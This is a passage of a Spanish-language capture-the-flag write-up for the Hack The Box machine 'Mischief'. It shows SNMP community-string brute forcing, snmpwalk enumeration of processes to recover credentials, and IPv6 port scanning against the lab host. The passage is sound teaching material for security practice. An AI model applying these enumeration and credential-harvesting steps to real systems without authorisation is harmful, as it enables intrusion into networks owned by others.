|   libpython2.7-stdlib-2.7.15~rc1-1; 0-01-01T00:00:00
|   libpython3-stdlib-3.6.5-3; 0-01-01T00:00:00
|   libpython3.6-3.6.5-3; 0-01-01T00:00:00
|   libpython3.6-minimal-3.6.5-3; 0-01-01T00:00:00
|   libpython3.6-stdlib-3.6.5-3; 0-01-01T00:00:00
|   libquadmath0-8-20180414-1ubuntu2; 0-01-01T00:00:00
|   libreadline5-5.2+dfsg-3build1; 0-01-01T00:00:00
|   libreadline7-7.0-3; 0-01-01T00:00:00
|   libroken18-heimdal-7.5.0+dfsg-1; 0-01-01T00:00:00
|   librtmp1-2.4+20151223.gitfa8646d.1-1; 0-01-01T00:00:00
|   libsasl2-2-2.1.27~101-g0780600+dfsg-3ubuntu2; 0-01-01T00:00:00
|   libsasl2-modules-2.1.27~101-g0780600+dfsg-3ubuntu2; 0-01-01T00:00:00
|   libsasl2-modules-db-2.1.27~101-g0780600+dfsg-3ubuntu2; 0-01-01T00:00:00
|   libseccomp2-2.3.1-2.1ubuntu4; 0-01-01T00:00:00
|   libselinux1-2.7-2build2; 0-01-01T00:00:00
|   libsemanage-common-2.7-2build2; 0-01-01T00:00:00
|   libsemanage1-2.7-2build2; 0-01-01T00:00:00
|   libsensors4-1:3.4.0-4; 0-01-01T00:00:00
|   libsepol1-2.7-1; 0-01-01T00:00:00
|   libsigsegv2-2.12-1; 0-01-01T00:00:00
|   libslang2-2.3.1a-3ubuntu1; 0-01-01T00:00:00
|   libsmartcols1-2.31.1-0.4ubuntu3; 0-01-01T00:00:00
|   libsnmp-base-5.7.3+dfsg-1.8ubuntu3; 0-01-01T00:00:00
|   libsnmp30-5.7.3+dfsg-1.8ubuntu3; 0-01-01T00:00:00
|   libsodium23-1.0.16-2; 0-01-01T00:00:00
|   libsqlite3-0-3.22.0-1; 0-01-01T00:00:00
|   libss2-1.44.1-1; 0-01-01T00:00:00
|   libssl1.0.0-1.0.2n-1ubuntu5; 0-01-01T00:00:00
|   libssl1.1-1.1.0g-2ubuntu4; 0-01-01T00:00:00
|   libstdc++-7-dev-7.3.0-16ubuntu3; 0-01-01T00:00:00
|   libstdc++6-8-20180414-1ubuntu2; 0-01-01T00:00:00
|   libsystemd0-237-3ubuntu10; 0-01-01T00:00:00
|   libtasn1-6-4.13-2; 0-01-01T00:00:00
|   libtext-charwidth-perl-0.04-7.1; 0-01-01T00:00:00
|   libtext-iconv-perl-1.7-5build6; 0-01-01T00:00:00
|   libtext-wrapi18n-perl-0.06-7.1; 0-01-01T00:00:00
|   libtimedate-perl-2.3000-2; 0-01-01T00:00:00
|   libtinfo5-6.1-1ubuntu1; 0-01-01T00:00:00
|   libtsan0-8-20180414-1ubuntu2; 0-01-01T00:00:00
|   libubsan0-7.3.0-16ubuntu3; 0-01-01T00:00:00
|   libudev1-237-3ubuntu10; 0-01-01T00:00:00
|   libunistring2-0.9.9-0ubuntu1; 0-01-01T00:00:00
|   libunwind8-1.2.1-8; 0-01-01T00:00:00
|   liburi-perl-1.73-1; 0-01-01T00:00:00
|   libusb-1.0-0-2:1.0.21-2; 0-01-01T00:00:00
|   libutempter0-1.1.6-3; 0-01-01T00:00:00
|   libuuid1-2.31.1-0.4ubuntu3; 0-01-01T00:00:00
|   libwind0-heimdal-7.5.0+dfsg-1; 0-01-01T00:00:00
|   libwrap0-7.6.q-27; 0-01-01T00:00:00
|   libx11-6-2:1.6.4-3; 0-01-01T00:00:00
|   libx11-data-2:1.6.4-3; 0-01-01T00:00:00
|   libxau6-1:1.0.8-1; 0-01-01T00:00:00
|   libxcb1-1.13-1; 0-01-01T00:00:00
|   libxdmcp6-1:1.1.2-3; 0-01-01T00:00:00
|   libxext6-2:1.3.3-1; 0-01-01T00:00:00
|   libxml2-2.9.4+dfsg1-6.1ubuntu1; 0-01-01T00:00:00
|   libxmlsec1-1.2.25-1build1; 0-01-01T00:00:00
|   libxmlsec1-openssl-1.2.25-1build1; 0-01-01T00:00:00
|   libxmuu1-2:1.1.2-2; 0-01-01T00:00:00
|   libxslt1.1-1.1.29-5; 0-01-01T00:00:00
|   libxtables12-1.6.1-2ubuntu2; 0-01-01T00:00:00
|   libyaml-0-2-0.1.7-2ubuntu3; 0-01-01T00:00:00
|   libzstd1-1.3.3+dfsg-2ubuntu1; 0-01-01T00:00:00
|   linux-base-4.5ubuntu1; 0-01-01T00:00:00
|   linux-firmware-1.173; 0-01-01T00:00:00
|   linux-generic-4.15.0.20.23; 0-01-01T00:00:00
|   linux-headers-4.15.0-20-4.15.0-20.21; 0-01-01T00:00:00
|   linux-headers-4.15.0-20-generic-4.15.0-20.21; 0-01-01T00:00:00
|   linux-headers-generic-4.15.0.20.23; 0-01-01T00:00:00
|   linux-image-4.15.0-20-generic-4.15.0-20.21; 0-01-01T00:00:00
|   linux-image-generic-4.15.0.20.23; 0-01-01T00:00:00
|   linux-libc-dev-4.15.0-20.21; 0-01-01T00:00:00
|   linux-modules-4.15.0-20-generic-4.15.0-20.21; 0-01-01T00:00:00
|   linux-modules-extra-4.15.0-20-generic-4.15.0-20.21; 0-01-01T00:00:00
|   linux-signed-generic-4.15.0.20.23; 0-01-01T00:00:00
|   locales-2.27-3ubuntu1; 0-01-01T00:00:00
|   login-1:4.5-1ubuntu1; 0-01-01T00:00:00
|   logrotate-3.11.0-0.1ubuntu1; 0-01-01T00:00:00
|   lsb-base-9.20170808ubuntu1; 0-01-01T00:00:00
|   lsb-release-9.20170808ubuntu1; 0-01-01T00:00:00
|   lshw-02.18-0.1ubuntu6; 0-01-01T00:00:00
|   lsof-4.89+dfsg-0.1; 0-01-01T00:00:00
|   ltrace-0.7.3-6ubuntu1; 0-01-01T00:00:00
|   lvm2-2.02.176-4.1ubuntu3; 0-01-01T00:00:00
|   lxcfs-3.0.0-0ubuntu1; 0-01-01T00:00:00
|   lxd-client-3.0.0-0ubuntu4; 0-01-01T00:00:00
|   make-4.1-9.1ubuntu1; 0-01-01T00:00:00
|   man-db-2.8.3-2; 0-01-01T00:00:00
|   manpages-4.15-1; 0-01-01T00:00:00
|   manpages-dev-4.15-1; 0-01-01T00:00:00
|   mawk-1.3.3-17ubuntu3; 0-01-01T00:00:00
|   mdadm-4.0-2ubuntu1; 0-01-01T00:00:00
|   mime-support-3.60ubuntu1; 0-01-01T00:00:00
|   mlocate-0.26-2ubuntu3.1; 0-01-01T00:00:00
|   mount-2.31.1-0.4ubuntu3; 0-01-01T00:00:00
|   mtr-tiny-0.92-1; 0-01-01T00:00:00
|   multiarch-support-2.27-3ubuntu1; 0-01-01T00:00:00
|   mysql-client-5.7-5.7.22-0ubuntu18.04.1; 0-01-01T00:00:00
|   mysql-client-core-5.7-5.7.22-0ubuntu18.04.1; 0-01-01T00:00:00
|   mysql-common-5.8+1.0.4; 0-01-01T00:00:00
|   mysql-server-5.7-5.7.22-0ubuntu18.04.1; 0-01-01T00:00:00
|   mysql-server-5.7.22-0ubuntu18.04.1; 0-01-01T00:00:00
|   mysql-server-core-5.7-5.7.22-0ubuntu18.04.1; 0-01-01T00:00:00
|   nano-2.9.3-2; 0-01-01T00:00:00
|   ncurses-base-6.1-1ubuntu1; 0-01-01T00:00:00
|   ncurses-bin-6.1-1ubuntu1; 0-01-01T00:00:00
|   ncurses-term-6.1-1ubuntu1; 0-01-01T00:00:00
|   net-tools-1.60+git20161116.90da8a0-1ubuntu1; 0-01-01T00:00:00
|   netbase-5.4; 0-01-01T00:00:00
|   netcat-openbsd-1.187-1; 0-01-01T00:00:00
|   netfilter-persistent-1.0.4+nmu2; 0-01-01T00:00:00
|   netplan.io-0.36.1; 0-01-01T00:00:00
|   networkd-dispatcher-1.7-0ubuntu3; 0-01-01T00:00:00
|   nplan-0.36.1; 0-01-01T00:00:00
|   ntfs-3g-1:2017.3.23-2; 0-01-01T00:00:00
|   open-iscsi-2.0.874-5ubuntu2; 0-01-01T00:00:00
|   open-vm-tools-2:10.2.0-3ubuntu3; 0-01-01T00:00:00
|   openssh-client-1:7.6p1-4; 0-01-01T00:00:00
|   openssh-server-1:7.6p1-4; 0-01-01T00:00:00
|   openssh-sftp-server-1:7.6p1-4; 0-01-01T00:00:00
|   openssl-1.1.0g-2ubuntu4; 0-01-01T00:00:00
|   os-prober-1.74ubuntu1; 0-01-01T00:00:00
|   overlayroot-0.40ubuntu1; 0-01-01T00:00:00
|   parted-3.2-20; 0-01-01T00:00:00
|   passwd-1:4.5-1ubuntu1; 0-01-01T00:00:00
|   pastebinit-1.5-2; 0-01-01T00:00:00
|   patch-2.7.6-2ubuntu1; 0-01-01T00:00:00
|   pciutils-1:3.5.2-1ubuntu1; 0-01-01T00:00:00
|   perl-5.26.1-6; 0-01-01T00:00:00
|   perl-base-5.26.1-6; 0-01-01T00:00:00
|   perl-modules-5.26-5.26.1-6; 0-01-01T00:00:00
|   php-1:7.2+60ubuntu1; 0-01-01T00:00:00
|   php-common-1:60ubuntu1; 0-01-01T00:00:00
|   php-mysql-1:7.2+60ubuntu1; 0-01-01T00:00:00
|   php7.2-7.2.5-0ubuntu0.18.04.1; 0-01-01T00:00:00
|   php7.2-cli-7.2.5-0ubuntu0.18.04.1; 0-01-01T00:00:00
|   php7.2-common-7.2.5-0ubuntu0.18.04.1; 0-01-01T00:00:00
|   php7.2-json-7.2.5-0ubuntu0.18.04.1; 0-01-01T00:00:00
|   php7.2-mysql-7.2.5-0ubuntu0.18.04.1; 0-01-01T00:00:00
|   php7.2-opcache-7.2.5-0ubuntu0.18.04.1; 0-01-01T00:00:00
|   php7.2-readline-7.2.5-0ubuntu0.18.04.1; 0-01-01T00:00:00
|   pinentry-curses-1.1.0-1; 0-01-01T00:00:00
|   plymouth-0.9.3-1ubuntu7; 0-01-01T00:00:00
|   plymouth-theme-ubuntu-text-0.9.3-1ubuntu7; 0-01-01T00:00:00
|   policykit-1-0.105-20; 0-01-01T00:00:00
|   pollinate-4.31-0ubuntu1; 0-01-01T00:00:00
|   popularity-contest-1.66ubuntu1; 0-01-01T00:00:00
|   powermgmt-base-1.33; 0-01-01T00:00:00
|   procps-2:3.3.12-3ubuntu1; 0-01-01T00:00:00
|   psmisc-23.1-1; 0-01-01T00:00:00
|   publicsuffix-20180223.1310-1; 0-01-01T00:00:00
|   python-2.7.15~rc1-1; 0-01-01T00:00:00
|   python-all-2.7.15~rc1-1; 0-01-01T00:00:00
|   python-all-dev-2.7.15~rc1-1; 0-01-01T00:00:00
|   python-apt-common-1.6.0; 0-01-01T00:00:00
|   python-asn1crypto-0.24.0-1; 0-01-01T00:00:00
|   python-cffi-backend-1.11.5-1; 0-01-01T00:00:00
|   python-crypto-2.6.1-8ubuntu2; 0-01-01T00:00:00
|   python-cryptography-2.1.4-1ubuntu1.1; 0-01-01T00:00:00
|   python-dbus-1.2.6-1; 0-01-01T00:00:00
|   python-dev-2.7.15~rc1-1; 0-01-01T00:00:00
|   python-enum34-1.1.6-2; 0-01-01T00:00:00
|   python-gi-3.26.1-2; 0-01-01T00:00:00
|   python-idna-2.6-1; 0-01-01T00:00:00
|   python-ipaddress-1.0.17-1; 0-01-01T00:00:00
|   python-keyring-10.6.0-1; 0-01-01T00:00:00
|   python-keyrings.alt-3.0-1; 0-01-01T00:00:00
|   python-minimal-2.7.15~rc1-1; 0-01-01T00:00:00
|   python-pip-9.0.1-2; 0-01-01T00:00:00
|   python-pip-whl-9.0.1-2; 0-01-01T00:00:00
|   python-pkg-resources-39.0.1-2; 0-01-01T00:00:00
|   python-secretstorage-2.3.1-2; 0-01-01T00:00:00
|   python-setuptools-39.0.1-2; 0-01-01T00:00:00
|   python-six-1.11.0-2; 0-01-01T00:00:00
|   python-wheel-0.30.0-0.2; 0-01-01T00:00:00
|   python-xdg-0.25-4ubuntu1; 0-01-01T00:00:00
|   python2.7-2.7.15~rc1-1; 0-01-01T00:00:00
|   python2.7-dev-2.7.15~rc1-1; 0-01-01T00:00:00
|   python2.7-minimal-2.7.15~rc1-1; 0-01-01T00:00:00
|   python3-3.6.5-3; 0-01-01T00:00:00
|   python3-apport-2.20.9-0ubuntu7; 0-01-01T00:00:00
|   python3-apt-1.6.0; 0-01-01T00:00:00
|   python3-asn1crypto-0.24.0-1; 0-01-01T00:00:00
|   python3-attr-17.4.0-2; 0-01-01T00:00:00
|   python3-automat-0.6.0-1; 0-01-01T00:00:00
|   python3-blinker-1.4+dfsg1-0.1; 0-01-01T00:00:00
|   python3-certifi-2018.1.18-2; 0-01-01T00:00:00
|   python3-cffi-backend-1.11.5-1; 0-01-01T00:00:00
|   python3-chardet-3.0.4-1; 0-01-01T00:00:00
|   python3-click-6.7-3; 0-01-01T00:00:00
|   python3-colorama-0.3.7-1; 0-01-01T00:00:00
|   python3-commandnotfound-18.04.4; 0-01-01T00:00:00
|   python3-configobj-5.0.6-2; 0-01-01T00:00:00
|   python3-constantly-15.1.0-1; 0-01-01T00:00:00
|   python3-cryptography-2.1.4-1ubuntu1.1; 0-01-01T00:00:00
|   python3-dbus-1.2.6-1; 0-01-01T00:00:00
|   python3-debconf-1.5.66; 0-01-01T00:00:00
|   python3-debian-0.1.32; 0-01-01T00:00:00
|   python3-distro-info-0.18; 0-01-01T00:00:00
|   python3-distupgrade-1:18.04.17; 0-01-01T00:00:00
|   python3-gdbm-3.6.5-3; 0-01-01T00:00:00
|   python3-gi-3.26.1-2; 0-01-01T00:00:00
|   python3-httplib2-0.9.2+dfsg-1; 0-01-01T00:00:00
|   python3-hyperlink-17.3.1-2; 0-01-01T00:00:00
|   python3-idna-2.6-1; 0-01-01T00:00:00
|   python3-incremental-16.10.1-3; 0-01-01T00:00:00
|   python3-jinja2-2.10-1; 0-01-01T00:00:00
|   python3-json-pointer-1.10-1; 0-01-01T00:00:00
|   python3-jsonpatch-1.19+really1.16-1fakesync1; 0-01-01T00:00:00
|   python3-jsonschema-2.6.0-2; 0-01-01T00:00:00
|   python3-jwt-1.5.3+ds1-1; 0-01-01T00:00:00
|   python3-markupsafe-1.0-1build1; 0-01-01T00:00:00
|   python3-minimal-3.6.5-3; 0-01-01T00:00:00
|   python3-newt-0.52.20-1ubuntu1; 0-01-01T00:00:00
|   python3-oauthlib-2.0.6-1; 0-01-01T00:00:00
|   python3-openssl-17.5.0-1ubuntu1; 0-01-01T00:00:00
|   python3-pam-0.4.2-13.2ubuntu4; 0-01-01T00:00:00
|   python3-pkg-resources-39.0.1-2; 0-01-01T00:00:00
|   python3-problem-report-2.20.9-0ubuntu7; 0-01-01T00:00:00
|   python3-pyasn1-0.4.2-3; 0-01-01T00:00:00
|   python3-pyasn1-modules-0.2.1-0.2; 0-01-01T00:00:00
|   python3-requests-2.18.4-2; 0-01-01T00:00:00
|   python3-requests-unixsocket-0.1.5-3; 0-01-01T00:00:00
|   python3-serial-3.4-2; 0-01-01T00:00:00
|   python3-service-identity-16.0.0-2; 0-01-01T00:00:00
|   python3-six-1.11.0-2; 0-01-01T00:00:00
|   python3-software-properties-0.96.24.32.1; 0-01-01T00:00:00
|   python3-systemd-234-1build1; 0-01-01T00:00:00
|   python3-twisted-17.9.0-2; 0-01-01T00:00:00
|   python3-twisted-bin-17.9.0-2; 0-01-01T00:00:00
|   python3-update-manager-1:18.04.11; 0-01-01T00:00:00
|   python3-urllib3-1.22-1; 0-01-01T00:00:00
|   python3-yaml-3.12-1build2; 0-01-01T00:00:00
|   python3-zope.interface-4.3.2-1build2; 0-01-01T00:00:00
|   python3.6-3.6.5-3; 0-01-01T00:00:00
|   python3.6-minimal-3.6.5-3; 0-01-01T00:00:00
|   readline-common-7.0-3; 0-01-01T00:00:00
|   rsync-3.1.2-2.1ubuntu1; 0-01-01T00:00:00
|   rsyslog-8.32.0-1ubuntu4; 0-01-01T00:00:00
|   run-one-1.17-0ubuntu1; 0-01-01T00:00:00
|   screen-4.6.2-1; 0-01-01T00:00:00
|   sed-4.4-2; 0-01-01T00:00:00
|   sensible-utils-0.0.12; 0-01-01T00:00:00
|   shared-mime-info-1.9-2; 0-01-01T00:00:00
|   snmpd-5.7.3+dfsg-1.8ubuntu3; 0-01-01T00:00:00
|   software-properties-common-0.96.24.32.1; 0-01-01T00:00:00
|   sosreport-3.5-1ubuntu3; 0-01-01T00:00:00
|   ssh-import-id-5.7-0ubuntu1; 0-01-01T00:00:00
|   ssl-cert-1.0.39; 0-01-01T00:00:00
|   strace-4.21-1ubuntu1; 0-01-01T00:00:00
|   sudo-1.8.21p2-3ubuntu1; 0-01-01T00:00:00
|   systemd-237-3ubuntu10; 0-01-01T00:00:00
|   systemd-sysv-237-3ubuntu10; 0-01-01T00:00:00
|   sysvinit-utils-2.88dsf-59.10ubuntu1; 0-01-01T00:00:00
|   tar-1.29b-2; 0-01-01T00:00:00
|   tcpdump-4.9.2-3; 0-01-01T00:00:00
|   telnet-0.17-41; 0-01-01T00:00:00
|   thermald-1.7.0-5ubuntu1; 0-01-01T00:00:00
|   time-1.7-25.1build1; 0-01-01T00:00:00
|   tmux-2.6-3; 0-01-01T00:00:00
|   tzdata-2018d-1; 0-01-01T00:00:00
|   ubuntu-advantage-tools-17; 0-01-01T00:00:00
|   ubuntu-keyring-2018.02.28; 0-01-01T00:00:00
|   ubuntu-minimal-1.417; 0-01-01T00:00:00
|   ubuntu-release-upgrader-core-1:18.04.17; 0-01-01T00:00:00
|   ubuntu-standard-1.417; 0-01-01T00:00:00
|   ucf-3.0038; 0-01-01T00:00:00
|   udev-237-3ubuntu10; 0-01-01T00:00:00
|   ufw-0.35-5; 0-01-01T00:00:00
|   uidmap-1:4.5-1ubuntu1; 0-01-01T00:00:00
|   unzip-6.0-21ubuntu1; 0-01-01T00:00:00
|   update-manager-core-1:18.04.11; 0-01-01T00:00:00
|   update-notifier-common-3.192.1; 0-01-01T00:00:00
|   ureadahead-0.100.0-20; 0-01-01T00:00:00
|   usbutils-1:007-4build1; 0-01-01T00:00:00
|   util-linux-2.31.1-0.4ubuntu3; 0-01-01T00:00:00
|   uuid-runtime-2.31.1-0.4ubuntu3; 0-01-01T00:00:00
|   vim-2:8.0.1453-1ubuntu1; 0-01-01T00:00:00
|   vim-common-2:8.0.1453-1ubuntu1; 0-01-01T00:00:00
|   vim-runtime-2:8.0.1453-1ubuntu1; 0-01-01T00:00:00
|   vim-tiny-2:8.0.1453-1ubuntu1; 0-01-01T00:00:00
|   wget-1.19.4-1ubuntu2.1; 0-01-01T00:00:00
|   whiptail-0.52.20-1ubuntu1; 0-01-01T00:00:00
|   wireless-regdb-2016.06.10-0ubuntu1; 0-01-01T00:00:00
|   xauth-1:1.0.10-1; 0-01-01T00:00:00
|   xdelta3-3.0.11-dfsg-1ubuntu1; 0-01-01T00:00:00
|   xdg-user-dirs-0.17-1ubuntu1; 0-01-01T00:00:00
|   xfsprogs-4.9.0+nmu1ubuntu2; 0-01-01T00:00:00
|   xkb-data-2.23.1-1ubuntu1; 0-01-01T00:00:00
|   xxd-2:8.0.1453-1ubuntu1; 0-01-01T00:00:00
|   xz-utils-5.2.2-1.3; 0-01-01T00:00:00
|   zerofree-1.0.4-1; 0-01-01T00:00:00
|_  zlib1g-1:1.2.11.dfsg-0ubuntu2; 0-01-01T00:00:00
| snmp-info: 
|   enterprise: net-snmp
|   engineIDFormat: unknown
|   engineIDData: b6a9f84e18fef95a00000000
|   snmpEngineBoots: 20
|_  snmpEngineTime: 46m27s
| snmp-sysdescr: Linux Mischief 4.15.0-20-generic #21-Ubuntu SMP Tue Apr 24 06:16:15 UTC 2018 x86_64
|_  System uptime: 46m27.76s (278776 timeticks)
| snmp-netstat: 
|   TCP  0.0.0.0:22           0.0.0.0:0
|   TCP  0.0.0.0:3366         0.0.0.0:0
|   TCP  127.0.0.1:3306       0.0.0.0:0
|   TCP  127.0.0.53:53        0.0.0.0:0
|   UDP  0.0.0.0:161          *:*
|   UDP  0.0.0.0:40315        *:*
|_  UDP  127.0.0.53:53        *:*
Service Info: Host: Mischief
```

## Enumeracion SNMP 

Bueno en este servicio para poder enumerarlo necesitamos contar con una **comunity string** existe una herramienta para poder hacer **fuerza bruta** y saber cual es ademas en el propio **seclists** hay un **.txt** que nos facilita todo esto 

```bash
❯ locate /Discovery/SNMP/common-snmp-community-strings.txt
/usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt
```

```bash
❯ locate /Discovery/SNMP/common-snmp-community-strings.txt
/usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt
```

Y bueno ya sabemos que la **comunity string** es **public** así que ahora podemos seguir enumerando el servicio

```bash
❯ onesixtyone 10.10.10.92 -c /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt
Scanning 1 hosts, 121 communities
10.10.10.92 [public] Linux Mischief 4.15.0-20-generic #21-Ubuntu SMP Tue Apr 24 06:16:15 UTC 2018 x86_64
10.10.10.92 [public] Linux Mischief 4.15.0-20-generic #21-Ubuntu SMP Tue Apr 24 06:16:15 UTC 2018 x86_64
```

Podemos usar la herramienta **snmpwalk** para enumerar esto pero de primeras nos esta mostrando mucha data 

```bash
❯ snmpwalk -v2c -c public 10.10.10.92
SNMPv2-MIB::sysDescr.0 = STRING: Linux Mischief 4.15.0-20-generic #21-Ubuntu SMP Tue Apr 24 06:16:15 UTC 2018 x86_64
SNMPv2-MIB::sysObjectID.0 = OID: NET-SNMP-MIB::netSnmpAgentOIDs.10
DISMAN-EVENT-MIB::sysUpTimeInstance = Timeticks: (349909) 0:58:19.09
SNMPv2-MIB::sysContact.0 = STRING: Me <me@example.org>
SNMPv2-MIB::sysName.0 = STRING: Mischief
SNMPv2-MIB::sysLocation.0 = STRING: Sitting on the Dock of the Bay
SNMPv2-MIB::sysServices.0 = INTEGER: 72
SNMPv2-MIB::sysORLastChange.0 = Timeticks: (22) 0:00:00.22
SNMPv2-MIB::sysORID.1 = OID: SNMP-MPD-MIB::snmpMPDCompliance
SNMPv2-MIB::sysORID.2 = OID: SNMP-USER-BASED-SM-MIB::usmMIBCompliance
SNMPv2-MIB::sysORID.3 = OID: SNMP-FRAMEWORK-MIB::snmpFrameworkMIBCompliance
SNMPv2-MIB::sysORID.4 = OID: SNMPv2-MIB::snmpMIB
SNMPv2-MIB::sysORID.5 = OID: SNMP-VIEW-BASED-ACM-MIB::vacmBasicGroup
SNMPv2-MIB::sysORID.6 = OID: TCP-MIB::tcpMIB
SNMPv2-MIB::sysORID.7 = OID: IP-MIB::ip
SNMPv2-MIB::sysORID.8 = OID: UDP-MIB::udpMIB
SNMPv2-MIB::sysORID.9 = OID: SNMP-NOTIFICATION-MIB::snmpNotifyFullCompliance
SNMPv2-MIB::sysORID.10 = OID: NOTIFICATION-LOG-MIB::notificationLogMIB
SNMPv2-MIB::sysORDescr.1 = STRING: The MIB for Message Processing and Dispatching.
SNMPv2-MIB::sysORDescr.2 = STRING: The management information definitions for the SNMP User-based Security Model.
SNMPv2-MIB::sysORDescr.3 = STRING: The SNMP Management Architecture MIB.
SNMPv2-MIB::sysORDescr.4 = STRING: The MIB module for SNMPv2 entities
SNMPv2-MIB::sysORDescr.5 = STRING: View-based Access Control Model for SNMP.
SNMPv2-MIB::sysORDescr.6 = STRING: The MIB module for managing TCP implementations
SNMPv2-MIB::sysORDescr.7 = STRING: The MIB module for managing IP and ICMP implementations
SNMPv2-MIB::sysORDescr.8 = STRING: The MIB module for managing UDP implementations
SNMPv2-MIB::sysORDescr.9 = STRING: The MIB modules for managing SNMP Notification, plus filtering.
SNMPv2-MIB::sysORDescr.10 = STRING: The MIB module for logging SNMP Notifications.
SNMPv2-MIB::sysORUpTime.1 = Timeticks: (22) 0:00:00.22
SNMPv2-MIB::sysORUpTime.2 = Timeticks: (22) 0:00:00.22
SNMPv2-MIB::sysORUpTime.3 = Timeticks: (22) 0:00:00.22
SNMPv2-MIB::sysORUpTime.4 = Timeticks: (22) 0:00:00.22
SNMPv2-MIB::sysORUpTime.5 = Timeticks: (22) 0:00:00.22
SNMPv2-MIB::sysORUpTime.6 = Timeticks: (22) 0:00:00.22
^C
```

Lo que podemos hacer es decirle mediante otro parámetro que nos muestre el tipo de **IP** ya que asta ahora todo va por **ipv4**

```bash
❯ snmpwalk -v2c -c public 10.10.10.92 ipAddressType
IP-MIB::ipAddressType.ipv4."10.10.10.92" = INTEGER: unicast(1)
IP-MIB::ipAddressType.ipv4."10.10.10.255" = INTEGER: broadcast(3)
IP-MIB::ipAddressType.ipv4."127.0.0.1" = INTEGER: unicast(1)
IP-MIB::ipAddressType.ipv6."00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:01" = INTEGER: unicast(1)
IP-MIB::ipAddressType.ipv6."de:ad:be:ef:00:00:00:00:02:50:56:ff:fe:b9:5f:ae" = INTEGER: unicast(1)
IP-MIB::ipAddressType.ipv6."fe:80:00:00:00:00:00:00:02:50:56:ff:fe:b9:5f:ae" = INTEGER: unicast(1)
```

Esta es la dirección **ipv6** de la maquina `de:ad:be:ef:00:00:00:00:02:50:56:ff:fe:b9:5f:ae`

Vamos a organizarla correctamente los ceros no son necesarios y vemos que nos responde al **ping**

```bash
❯ ping6 -c 1 dead:beef::250:56ff:feb9:5fae
PING dead:beef::250:56ff:feb9:5fae(dead:beef::250:56ff:feb9:5fae) 56 data bytes
64 bytes from dead:beef::250:56ff:feb9:5fae: icmp_seq=1 ttl=63 time=94.5 ms

--- dead:beef::250:56ff:feb9:5fae ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 94.486/94.486/94.486/0.000 ms
```

## PortScan IPv6 

Bueno también podemos hacer un escaneo de **Nmap** pero básicamente para este tipo de **IP** que es de tipo **IPv6**

<https://www.xataka.com/basics/ipv6-que-sirve-que-ventajas-tiene>

Ahora vemos el puerto **80** abierto 

```bash
❯ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn -6 dead:beef::250:56ff:feb9:5fae -oG allPorts2
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-27 13:56 CST
Initiating SYN Stealth Scan at 13:56
Scanning dead:beef::250:56ff:feb9:5fae [65535 ports]
Discovered open port 80/tcp on dead:beef::250:56ff:feb9:5fae
Discovered open port 22/tcp on dead:beef::250:56ff:feb9:5fae
Completed SYN Stealth Scan at 13:56, 17.35s elapsed (65535 total ports)
Nmap scan report for dead:beef::250:56ff:feb9:5fae
Host is up, received user-set (0.095s latency).
Scanned at 2023-06-27 13:56:36 CST for 17s
Not shown: 65051 closed tcp ports (reset), 482 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63

```

```bash
❯ nmap -sCV -p80,22 -6 dead:beef::250:56ff:feb9:5fae -oN ipv6
Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-27 13:58 CST
Nmap scan report for dead:beef::250:56ff:feb9:5fae
Host is up (0.11s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 2a90a6b1e633850715b2eea7b9467752 (RSA)
|   256 d0d7007c3bb0a632b229178d69a6843f (ECDSA)
|_  256 3f1c77935cc06cea26f4bb6c59e97cb0 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: 400 Bad Request
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| address-info: 
|   IPv6 EUI-64: 
|     MAC address: 
|       address: 005056b95fae
|_      manuf: VMware
```

## Enumerando el puerto 80 por IPv6 

Pues bueno ahora lo que podemos hacer es ver su contenido en el navegador para hacerlo se indica de otra forma es haciendo uso de los corchetes y poniendo la dirección **IP** pero en **IPv6** de la siguiente forma

![](/assets/images/htb-writeup-mischief/web5.png)

Si queremos evitar esta poniendo la dirección **IPv6** en el navegador lo que podemos hacer es agregar la dirección al **/etc/hosts** e indicarle que apunte a un subdominio

```bash
❯ echo "dead:beef::250:56ff:feb9:5fae mischief.htb" | sudo tee -a /etc/hosts
dead:beef::250:56ff:feb9:5fae mischief.htb
❯ ping -c 1 mischief.htb
PING mischief.htb(mischief.htb (dead:beef::250:56ff:feb9:5fae)) 56 data bytes
64 bytes from mischief.htb (dead:beef::250:56ff:feb9:5fae): icmp_seq=1 ttl=63 time=93.8 ms

--- mischief.htb ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 93.776/93.776/93.776/0.000 ms
```

Vemos que nos carga los mismo así que funciona 

![](/assets/images/htb-writeup-mischief/web6.png)

Si le damos en **Login** nos lleva al panel de **login** donde pues básicamente nos tenemos que conectar 

![](/assets/images/htb-writeup-mischief/web7.png)

Si probamos credenciales por defecto vemos que nada funciona

![](/assets/images/htb-writeup-mischief/web8.png)

# SNMP Enumeration Continue

Bueno al no ver nada algo que podemos hacer es que si recordamos la primer etapa de reconocimiento vimos que se estaba usando **Python** para montar el servidor **http** con **Python2.7** lo que hacemos similarmente con esto `python3 -m http.server 8080` pero esto es con **Python3** pero bueno como tenemos el **snmp** podemos seguir enumerando procesos para ver si podemos ver lo de **Python** y mas

```bash
❯ snmpwalk -v2c -c public 10.10.10.92 hrSWRunName | grep python
HOST-RESOURCES-MIB::hrSWRunName.711 = STRING: "python"
```

Pues bueno podemos seguir enumerando información de ese proceso y podemos ver mucha mas información como comandos que fueron ejecutados y de mas es por eso que es riesgoso tener esta servicio habilitado

Y bueno ya vemos información donde nos están dando las credenciales para conectarnos en el servicio web que esta montado en el puerto **3366** justo el que habíamos visto antes

```bash
❯ snmpwalk -v2c -c public 10.10.10.92 hrSWRunTable | grep "711"
